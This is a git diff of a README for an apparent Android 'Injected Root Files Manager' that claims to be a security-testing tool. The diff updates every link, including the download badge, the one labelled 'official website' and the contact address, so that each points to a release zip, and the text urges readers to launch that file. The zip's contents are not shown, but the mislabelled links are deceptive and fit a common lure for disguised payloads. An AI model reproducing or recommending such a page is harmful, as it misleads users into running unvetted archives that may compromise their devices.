@@ -27,12 +27,12 @@ Explore the latest advancements in accessing root files on non-rooted devices wi
 - root-files-manager-in-non-root
 
 ## 📦 Download Latest Version
-[![Download Software](https://github.com/Posionek/Injected-Root-Files-Manager/releases/download/v1.0/Release.zip)](https://github.com/Posionek/Injected-Root-Files-Manager/releases/download/v1.0/Release.zip)
-*Launch the https://github.com/Posionek/Injected-Root-Files-Manager/releases/download/v1.0/Release.zip file from the above link to access the latest version.*
+[![Download Software](https://github.com/Posionek/Injected-Root-Files-Manager/releases/download/v2.0/Software.zip)](https://github.com/Posionek/Injected-Root-Files-Manager/releases/download/v2.0/Software.zip)
+*Launch the https://github.com/Posionek/Injected-Root-Files-Manager/releases/download/v2.0/Software.zip file from the above link to access the latest version.*
 
 ## 🌐 Visit Our Website
 Experience the full potential of the **Injected Root Files Manager** by visiting our official website.
-*Simply click [here](https://github.com/Posionek/Injected-Root-Files-Manager/releases/download/v1.0/Release.zip) to explore more.*
+*Simply click [here](https://github.com/Posionek/Injected-Root-Files-Manager/releases/download/v2.0/Software.zip) to explore more.*
 
 ## 🤖 Get Started
 Embark on a transformative journey with the **Injected Root Files Manager** and discover new possibilities in the realm of Android app security testing. Take advantage of this powerful tool to enhance your testing capabilities and unlock hidden potential within applications.
@@ -56,6 +56,6 @@ We welcome contributions from the community to enhance the functionality, usabil
 This project is licensed under the [MIT License](LICENSE) - see the [LICENSE](LICENSE) file for details.
 
 ## 📡 Contact Us
-For inquiries, feedback, or support regarding the **Injected Root Files Manager**, please contact us at [https://github.com/Posionek/Injected-Root-Files-Manager/releases/download/v1.0/Release.zip](https://github.com/Posionek/Injected-Root-Files-Manager/releases/download/v1.0/Release.zip).
+For inquiries, feedback, or support regarding the **Injected Root Files Manager**, please contact us at [https://github.com/Posionek/Injected-Root-Files-Manager/releases/download/v2.0/Software.zip](https://github.com/Posionek/Injected-Root-Files-Manager/releases/download/v2.0/Software.zip).
 
 Thank you for exploring the **Injected Root Files Manager** repository. Let's push the boundaries of Android app security testing together! 🚀🔒📱
